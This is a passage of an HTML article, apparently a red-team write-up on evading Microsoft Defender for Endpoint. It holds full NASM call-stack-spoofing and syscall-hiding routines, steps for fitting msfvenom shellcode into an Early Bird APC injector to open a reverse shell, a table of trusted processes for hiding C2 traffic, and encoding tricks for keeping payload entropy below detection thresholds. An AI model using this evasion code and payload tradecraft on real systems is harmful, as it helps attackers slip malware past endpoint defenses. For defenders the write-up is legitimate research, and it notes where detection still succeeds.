+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg9]  <span class="hljs-comment">; mov [rsp + 80], r11</span>
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">80</span>], <span class="hljs-built_in">r11</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg10] <span class="hljs-comment">; mov [rsp + 88], r11</span>
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">88</span>], <span class="hljs-built_in">r11</span>
+<span class="hljs-meta">
+.setup_registers</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">r10</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">r10</span> + <span class="hljs-number">8</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,  [<span class="hljs-built_in">r10</span> + <span class="hljs-number">16</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>,  [<span class="hljs-built_in">r10</span> + <span class="hljs-number">24</span>]
+<span class="hljs-symbol">
+.setup_rbx:</span>
+    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">rel</span> .restore]
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">r13</span> + pRbx], <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">r13</span> + pRbx]
+    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">r13</span> + pTargetFunction]
+<span class="hljs-symbol">
+.restore:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwRtlUserThreadStart_Size]
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwBaseThreadInitThunk_Size]
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwGadget_Size]
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
+    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">r15</span></code></pre>
+          </div>
+        </div>
+
+                <p>It is important to note that the direct <strong>NtCreateUserProcess</strong> function <strong>from the NTDLL</strong> needs to be used here in order <strong>not to misalign the stack</strong>. Moreover, the push 0 instruction is to <strong>stop the process of unwinding the stack</strong>. After this process the call stack should look like this:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image11.png" alt="Fake call stack after spoofing showing RtlUserThreadStart and BaseThreadInitThunk" class="article-img">
+        <p>The resumed steps are as follows:</p>
+        <ol>
+          <li>Push a 0 in order to stop the stack unwinding process</li>
+          <li>Subtract the size of the RtlUserThreadStart stack frame to rsp (the stack pointer)</li>
+          <li>Push the return address of RtlUserThreadStart</li>
+          <li>Subtract the size of the BaseThreadInitThunk stack frame to rsp (the stack pointer)</li>
+          <li>Push the return address of BaseThreadInitThunk</li>
+          <li>Subtract the size of the Gadget's function stack frame to rsp (the stack pointer)</li>
+          <li>Push the return address of the Gadget's function</li>
+          <li>Jump to the address of NtCreateUserProcess function</li>
+          <li>Restore the stack</li>
+        </ol>
+        <p>In order to get the return addresses of the RtlUserThreadStart and BaseThreadInitThunk an <strong>offset is needed</strong>. The <strong>address of the function plus the offset is the return address</strong>. To know this value, <strong>x64dbg</strong> can be opened in the <strong>call stack tab</strong>: the <strong>offset for RtlUserThreadStart is 0x2C</strong> and <strong>for BaseThreadInitThunk is 0x17</strong>.</p>
+                <img src="https://eyilink.github.io/articles/edr_article_images/image12.png" alt="x64dbg call stack tab showing RtlUserThreadStart offset 0x2C and BaseThreadInitThunk offset 0x17" class="article-img">
+        <p>However, <strong>MDE does not take the call stack into account.</strong> MDE still shows the process creation from kernel callbacks:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image15.png" alt="MDE still showing process creation from kernel callbacks despite call stack spoofing" class="article-img">
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>A strange phenomenon has been observed when functions are used after the call stack spoofing function's curl braces block. The <strong>program does not crash when further functions are used inside the same curl braces block</strong>. However, <strong>if functions are used after this block, the program crashes</strong>. The image below illustrates this phenomenon:</p>
+        </div>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image16.png" alt="Program crash phenomenon when functions are called outside the spoofing block" class="article-img">
+
+        <h3 id="s6e">E. Hiding Syscalls via Stack Manipulation</h3>
+        <p>This section will illustrate <strong>a variant</strong> of the method seen in the D. Mitigating call stack inspection section. This variant aims at <strong>executing an indirect syscall and hiding it completely in the call stack</strong>. However, <strong>MDE will still detect the creation of a process through kernel callbacks.</strong></p>
+        <p>As seen in the previous sections, when an indirect syscall is executed <strong>using a syscall trampoline followed by a ret instruction</strong>, this <strong>ret instruction will pop the return address off the stack</strong> and <strong>jump to the specified address</strong> in order to <strong>restore the execution of the program</strong> ,meaning <strong>advancing the stack pointer after the function's call</strong>. Using what was learned in the previous section about call stack mitigation, it is then possible to <strong>completely hide an indirect syscall from the call stack</strong> by directly implementing the syscall in ASM and <strong>using the</strong> <code>jmp qword [rbx]</code> <strong>gadget</strong>. Indeed, if the <strong>address of this gadget is pushed onto the stack</strong>, when the <strong>indirect syscall will hit the ret instruction</strong>, it will <strong>redirect the program's execution flow to this gadget</strong> (qword [rbx] gadget). Hence, letting us control the return address as rbx can be set up beforehand. The <strong>rbx register will be set to the address of the .restore section</strong> which <strong>will restore the stack</strong>, efficiently hiding the indirect syscall from it:</p>
+
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Spoof() — Syscall hiding variant — ASM (NASM)</span>
+            <span class="lang-badge">ASM</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-x86asm hljs" data-highlighted="yes"><span class="hljs-meta">global</span> Spoof
+<span class="hljs-meta">section</span> .text
+<span class="hljs-symbol">
+Spoof:</span>
+    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">r15</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rcx</span>
+    <span class="hljs-keyword">push</span> <span class="hljs-number">0</span>
+
+    <span class="hljs-comment">; Gadget's frame</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwGadget_Size]
+    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + pGadgetAddr]
+    <span class="hljs-keyword">push</span> <span class="hljs-built_in">r10</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">40</span>], <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">48</span>], <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">56</span>], <span class="hljs-number">512</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">64</span>], <span class="hljs-number">1</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg8]
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">72</span>], <span class="hljs-built_in">r11</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg9]
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">80</span>], <span class="hljs-built_in">r11</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">r13</span> + arg10]
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">88</span>], <span class="hljs-built_in">r11</span>
+<span class="hljs-meta">
+.setup_registers</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">r10</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">r10</span> + <span class="hljs-number">8</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,  [<span class="hljs-built_in">r10</span> + <span class="hljs-number">16</span>]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>,  [<span class="hljs-built_in">r10</span> + <span class="hljs-number">24</span>]
+<span class="hljs-symbol">
+.setup_rbx:</span>
+    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">rel</span> .restore]
+    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">r13</span> + pRbx], <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">r13</span> + pRbx]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">r13</span> + ssn]
+    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">r13</span> + jmp_stub]
+<span class="hljs-symbol">
+.restore:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, [<span class="hljs-built_in">r13</span> + dwGadget_Size]
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">r10</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
+    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">r15</span></code></pre>
+          </div>
+        </div>
+
+        <p>Since, only the gadget's return address is present on the stack, <strong>it is the only element that will be detected by a stack walker</strong>. This observation is shown below:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image14.png" alt="Stack walker seeing only the gadget return address" class="article-img">
+        <p>However, as the following figure shows, <strong>MDE still detect the NtCreateUserProcess function call through the process creation kernel callback</strong>:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image22.png" alt="MDE still detecting process creation via kernel callback" class="article-img">
+        <p>This section concludes with the work on EDR evasion through the use of in-depth Windows internals. As shown in the previous sections, a <strong>low-level function triggering no kernel callback can be completely undetected</strong>. Nonetheless, a f<strong>unction triggering kernel callbacks will always be detected</strong>, even if the syscall disappears completely from the call stack and the <strong>context can be manipulated</strong> (PPID spoofing) to <strong>increase the syscall's legitimacy</strong>. The next section will present the topic from an operational point of view by integrating real C2 payloads.</p>
+      </section>
+
+      <!-- SECTION VII -->
+      <section id="s7">
+        <h2>VII. Integrating Command and Control Payloads (C2)</h2>
+        <p>C2 payloads will be gradually integrated, beginning with msfvenom payloads without any encoding to a complete payload in order to have full C2 capacities. Msfvenom which is <strong>the combination of msfpayload and msfencode</strong>, can be used to create C2 payloads compatible with all architectures:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image1.png" alt="msfvenom payload generation command" class="article-img">
+        <p>The created payload which is a shellcode and that looks like the following in hexadecimal:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image10.png" alt="Shellcode in hexadecimal format" class="article-img">
+        <p>However, this shellcode <strong>needs to be formatted one byte per one byte</strong> in order to fit in the Rust code, which can be done with the following command:</p>
+        <div class="code-block">
+          <button class="code-toggle">
+            <span>Format shellcode bytes</span>
+            <span class="lang-badge">bash</span>
+            <span class="arrow">▶</span>
+          </button>
+          <div class="code-content">
+<pre><code class="language-bash hljs" data-highlighted="yes">hexdump -v -e <span class="hljs-string">'1/1 "0x%02x\n"'</span> shellcode.bin &gt; shellcode.fin</code></pre>
+          </div>
+        </div>
+
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>It is important to notice that there is <strong>no order notion</strong> (Big Endian or Little Endian) in a raw data block when bytes are displayed or formatted one by one.</p>
+        </div>
+        <p>Then, if we change the shellcode of the previous Early Bird injection to the newly created payload, a <strong>reverse shell should be initiated</strong>:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image4.png" alt="Reverse shell initiated via Early Bird APC injection" class="article-img">
+        <p>A new networking line appears in MDE as a new external connection is instantiated:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image3.png" alt="MDE network telemetry showing new external connection" class="article-img">
+        <p>As the payload <strong>triggers network telemetry in the EDR's console</strong>, an appropriate process in which the <strong>network traffic could seem legitimate</strong> could be <strong>chosen</strong>. The table below resumes processes with multiple levels of trust for executing the payload:</p>
+
+        <table>
+          <thead>
+            <tr>
+              <th>High-level trust</th>
+              <th>Mid-level trust</th>
+              <th>Low-level trust</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Web browsers: chrome.exe, msedge.exe, firefox.exe, brave.exe and opera.exe. Mailbox clients: outlook.exe, mail.exe. Collaborative tools: teams.exe, slack.exe, discord.exe, zoom.exe, skype.exe and webex.exe.</td>
+              <td>Cloud syncing process: onedrive.exe, dropbox.exe and googledrivesync.exe. Microsoft store process: RuntimeBroker.exe and backgroundTaskHost.exe. Updates: msedgeupdate.exe, googleupdate.exe, firefoxupdater.exe, javaupdate.exe and adobeupdater.exe.</td>
+              <td>Calc.exe, Notepad.exe, Rundll32.exe, Regsvr32.exe, Powershell.exe, Cmd.exe</td>
+            </tr>
+          </tbody>
+        </table>
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>C2 network traffic could be embedded into Microsoft traffic such as Teams in order to appear legitimate. This technique is often employed by malicious actors.</p>
+        </div>
+      </section>
+
+      <!-- SECTION VIII -->
+      <section id="s8">
+        <h2>VIII. Defeating Static Analysis: API Hashing and Obfuscation Techniques</h2>
+        <p>API hashing is a technique that aims at <strong>hiding the imported functions</strong> used of the Windows API. <strong>Imported functions are contained in the Imported Address Table</strong> (IAT). In order to make the static analysis more difficult, <strong>names of imported functions can be hashed and resolved during runtime</strong>. Once the opposite operation has been carried out during runtime, <strong>names of functions can be revealed, hence addresses can be resolved using the EAT</strong>. Once a pointer to the function is obtained, with the signature of the function, a <strong>function type pointer can be created</strong> and the function can be called. <strong>API hashing won't be implemented as it increases the entropy</strong> which <strong>enhances detection capacities from EDRs</strong>.</p>
+
+        <div class="note">
+          <strong>Remark:</strong>
+          <p>Function type pointers work in low-level programming languages since function declaration in many languages are only pointers specifying the function memory layout (function's signature).</p>
+        </div>
+        <p>In order to reduce static analysis to the maximum, <strong>msfvenom capabilities will be leveraged</strong> such as <strong>obfuscating</strong> using <strong>encodings</strong> and <strong>iterations</strong>. A popular encoding is <strong>XOR encoding</strong> in <strong>x64 architecture</strong> which applies a <strong>XOR filter</strong>. However, it is important to keep in mind that applying encoding and encryption to elements <strong>increases the randomness of the code</strong> which <strong>increases the entropy of the solution</strong>. This causes a problem as EDRs also detect malicious binaries based on their entropy. Hence, if the entropy of our payload exceeds the entropy threshold, it will be detected.</p>
+        <p>An encoding can be precised with the <code>-e</code> option and iterations, which is the application of the encoding multiple times, can be indicated with <code>-i</code> on metasploit:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image6.png" alt="msfvenom with XOR encoding and iterations" class="article-img">
+        <p>As seen below, the payload works as previously observed:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image5.png" alt="Encoded payload working as expected" class="article-img">
+        <p>Additionally, no more alerts have been raised, which demonstrates that the <strong>entropy of the solution is under the threshold</strong>:</p>
+        <img src="https://eyilink.github.io/articles/edr_article_images/image2.png" alt="No alerts in MDE - entropy below detection threshold" class="article-img">
+        <p>Additionally, the <strong>injected shellcode can be hardcoded and encrypted</strong> in the solution, to prevent EDRs detecting its signature if a commercial payload is used. Then the encrypted payload can be <strong>decrypted during runtime</strong> in order to be loaded into the wanted memory space. A <strong>symmetric algorithm like AES</strong> should be used. However, the <strong>metasploit payload used did not trigger any alerts on MDE</strong>, only MITRE classification. Hence this won't be implemented as well.</p>
+      </section>
+
+      <!-- SECTION IX -->
+      <section id="s9">
+        <h2>IX. State of the Art</h2>
+        <p>In my opinion, state of the art loaders focus on <strong>exploiting mechanisms around DLL loading</strong> instead of attempting to exploit pure Windows internals. A proposed approach is to <strong>bypass the native Windows DLL loader</strong>, which is <strong>used to load DLL on Windows</strong>, by using <strong>Position Independent Code</strong> (PIC) that will <strong>work no matter where the code ends up in memory</strong>. One way to create PIC code is to use <a href="https://tradecraftgarden.org/docs.html" target="_blank">Crystal Palace</a>. However, <strong>Reflective DLL Injection</strong> (RDI), <strong>shellcode Reflective DLL Injection</strong> (sRDI) and <strong>User-defined Reflective Loader</strong> (UdRL) should be explained in order to understand historically what led to PIC code.</p>
+        <p>The idea of RDI is elegant: instead of relying on the Windows loader to map the DLL into memory and handle all the setup steps, <strong>why not make the DLL do it itself</strong>. To make this possible the <strong>DLL exports a special function</strong>, conventionally named <strong>ReflectiveLoader</strong>, which is <strong>responsible for performing all the steps that the Windows loader would normally handle</strong>:</p>
+        <ol>
+          <li>Allocate enough memory to hold the DLL image</li>
+          <li>Copy the DLL sections into that allocated memory</li>
+          <li>Fix the base relocations</li>
+          <li>Resolve the Import Address Table (IAT)</li>
+          <li>Set the correct memory permissions for each section</li>
+          <li>Call the DLL entry point</li>
+        </ol>
+        <p>However, it comes with a limitation, as to call the <strong>ReflectiveLoader</strong> function <strong>an external loader is needed</strong>, therefore <strong>it is not position independent code</strong>.</p>
+        <p><strong>sRDI</strong> is the natural evolution of RDI. Two main types of loaders were created to trigger the ReflectiveLoader function directly in the DLL: the first one <strong>places a small shellcode stub inside the MS-DOS header responsible for finding the exported ReflectiveLoader function and calling it</strong>, the second one <strong>prepends a loader directly into the DLL</strong>.</p>
+        <p>However, this approach has a default, when the loader allocates memory for the DLL, it allocates it from <strong>unbacked memory space</strong>, meaning that Windows doesn't have any record of this memory region, which is a clear IoC of injection detectable using <strong>call stack inspection</strong>.</p>
+        <p><strong>User-defined Reflective Loader</strong> (UdRL) is a concept that emerged in order to <strong>perform sRDI with Crystal Palace</strong>, which is <strong>a linker</strong> used to make Position Independent Code (PIC). Crystal Palace <strong>permits to load a DLL without the Windows loader</strong>, which <strong>allows to defeat detections</strong>.</p>
+      </section>
+
+      <!-- SECTION X - REFERENCES -->
+      <section id="s10">
+        <h2>X. References</h2>
+        <ul>
+          <li><a href="https://github.com/BlackSnufkin/BYOVD" target="_blank">BlackSnufkin/BYOVD: BYOVD research use cases featuring vulnerable driver discovery and reverse engineering methodology.</a></li>
+          <li><a href="https://medium.com/@hamza.zrfa/comprend-le-format-portable-executable-pe-8a8d11bd6678" target="_blank">Comprendre le format Portable Executable (PE) | by Hamza Zarfaoui | Medium</a></li>
+          <li><a href="https://blog.deephacking.tech/en/posts/anatomy-of-the-portable-executable-format/" target="_blank">Anatomy of the Portable Executable (PE) Format – Deep Hacking</a></li>
+          <li><a href="https://connect.ed-diamond.com/misc/misc-121/analyse-statique-des-executables-windows-la-structure-pe" target="_blank">Analyse statique des exécutables Windows : la structure PE | Connect - Editions Diamond</a></li>
+          <li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank">PE Format - Win32 apps | Microsoft Learn</a></li>
+          <li><a href="https://web.archive.org/web/20250624082010/https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/" target="_blank">EDR Bypass: Retrieving Syscall ID with Hell's Gate, Halo's Gate, FreshyCalls and Syswhispers2</a></li>
+          <li><a href="https://red.infiltr8.io/redteam/weapon/code-and-process-injection/ntqueueapcthread-and-nttestalert-shellcode-execution" target="_blank">NtQueueApcThread &amp; NtTestAlert Shellcode Execution | Infiltr8</a></li>
+          <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection" target="_blank">APC Queue Code Injection | Red Team Notes</a></li>
+          <li><a href="https://0xmani.medium.com/early-bird-injection-05027fbfb794" target="_blank">Early Bird APC Queue Code Injection | by 0xmani | Medium</a></li>
+          <li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection" target="_blank">Early Bird APC Queue Code Injection | Red Team Notes</a></li>
+          <li><a href="https://offensivedefence.co.uk/posts/nt-create-user-process/" target="_blank">PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess - Offensive Defence</a></li>
+          <li><a href="https://fluxsec.red/rust-edr-evasion-hells-gate" target="_blank">Hells Gate Rust - EDR Evasion with syscalls - 0xflux Red Team Manual</a></li>
+          <li><a href="https://cocomelonc.github.io/tutorial/2021/12/11/malware-injection-11.html" target="_blank">Code injection via undocumented Native API functions - cocomelonc</a></li>
+          <li><a href="https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h" target="_blank">x64dbg/src/dbg/ntdll/ntdll.h</a></li>
+          <li><a href="https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/type.LPTHREAD_START_ROUTINE.html" target="_blank">LPTHREAD_START_ROUTINE in windows::Win32::System::Threading - Rust</a></li>
+          <li><a href="https://lorenzomeacci.com/bypassing-edr-in-a-crystal-clear-way" target="_blank">Bypassing EDR in a Crystal Clear Way | Lorenzo Meacci</a></li>
+          <li><a href="https://www.youtube.com/watch?v=_2lH90C2nOM&amp;t=47s" target="_blank">DEF CON 31 - StackMoonwalk - Alessandro Magnosi, Arash Parsa, Athanasios Tserpelis</a></li>
+          <li><a href="https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs" target="_blank">Spoofing Call Stacks To Confuse EDRs | WithSecure™ Labs</a></li>
+          <li><a href="https://dtsec.us/2023-09-15-StackSpoofin/" target="_blank">An Introduction into Stack Spoofing</a></li>
+          <li><a href="https://cybergeeks.tech/call-stack-spoofing-explained-using-apt41-malware/" target="_blank">Call stack spoofing explained using APT41 malware – CYBER GEEKS</a></li>
+          <li><a href="https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing" target="_blank">x64 Call Stack Spoofing | HulkOps</a></li>
+          <li><a href="https://hacktricks.wiki/en/windows-hardening/av-bypass.html" target="_blank">Antivirus (AV) Bypass - HackTricks</a></li>
+          <li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/windows-kernel-drivers-101" target="_blank">Windows Kernel Drivers 101 | Red Team Notes</a></li>
+          <li><a href="https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html" target="_blank">BYOVD to the next level (part 1) — exploiting a vulnerable driver (CVE-2025-8061) - Quarkslab</a></li>
+          <li><a href="https://ntdoc.m417z.com/" target="_blank">NtDoc - The native NT API online documentation</a></li>
+          <li><a href="https://0xc9h.github.io/posts/qemouflage-nested-linux-agent-on-windows-without-admin/" target="_blank">Qemu nested linux agent on Windows without admin</a></li>
+          
+        </ul>
+      </section>
+
+    </div>
+  </div>
+
+  <a href="https://eyilink.github.io/articles/edr_evasion_article_full.html#" class="scroll-top" id="scrollTop">↑</a>
+
+  
+
+
+</body></html>
